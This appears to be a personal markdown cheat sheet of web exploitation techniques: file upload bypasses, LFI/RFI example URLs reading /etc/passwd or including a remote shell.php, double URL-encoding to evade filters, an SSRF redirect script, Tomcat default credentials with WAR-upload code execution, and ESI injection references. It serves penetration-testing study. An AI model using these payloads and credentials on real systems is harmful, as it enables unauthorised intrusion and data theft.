# Web vulnerabilities
Methods and commands to exploit vulnerabilities after recon


# File upload
## Normal file upload vulnerability
*Magic Bytes*
```
BMP :    42 4D
JPG :    FF D8 FF E0
PNG :    89 50 4E 47
GIF :    47 49 46 38
```
### Checklist
- `hexeditor -b shell.php` (for full explanation refer to this article [https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/](https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/))
- Try double extensions (.php.jpg)
- Follow [this]([https://www.onsecurity.io/blog/file-upload-checklist/) article and try any other methods that I have not mentioned    
[(https://www.onsecurity.io/blog/file-upload-checklist/)](https://www.onsecurity.io/blog/file-upload-checklist/)


## Exiftool
If one discovered that the server is using exiftool to process the image uploaded one can try to exploit the tool with the following methods:
- CVE-2021-22204
- SVG to XSS (https://brutelogic.com.br/blog/file-upload-xss/)


## Pillow PY
- Check if the script that validates the image files is vulnerable to CVE-2018-16509
- Craft malicious image files


# File inclusion
## LFI
If a local file is queried via a URL parameter, an attacker might be able to query local files that weren't intended to be seen.
### Example usage and occurrence
`http://site.com?module=login.php`    
A bad actor could exploit this and make the following URL:    
`http://site.com?module=/etc/passwd`    


## RFI
This would happen when a web app allows users to include remote files in the URL.
### Example usage and occurrence
`http://site.com?file=http://127.0.0.1/file`    
A bad actor could exploit this and make the following URL:    
`http://site.com?file=http://127.0.0.1/shell.php`    
This would allow an attacker to get a malicious file on the webserver.
### Errors
If there are any error whilst trying the methods described above, one might try to url encode the whole url either once or numerous times.    
That is because some rules are configured so that they wouldn't look for url encoded strings.
#### Example
`../login.php` would become `..%252Flogin.php`

### Other help
[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)


# SSRF
Server Side Request Forgery
This would occur on a web page that allows for redirects. One could change the header with a proxy to their own server and upload / use their malicious file(s) on the victim's machine.
## Procedure
Make a script to redirect somewhere of your choice

```php
<?php
header("Location: http://site.com")
?>
```
Start up a local server `php -S <ip>:<port>`    
Query the script file from the victim site

# Tomcat
Help from: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
## Default credentials
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```
## RCE
If one has access to the Application Manager of Tomcat, the attacker can upload and run a .war file to execute code.     
**This is only possible if the account that the attacker is logged in with has enough privileges (admin,manager-script,manager)**


# ESIGate (ESI Injection)
Any ESIGate software is affected that has a lower version than *5.3*

## References
These are blog posts that consist of 2 parts
- [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
- [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)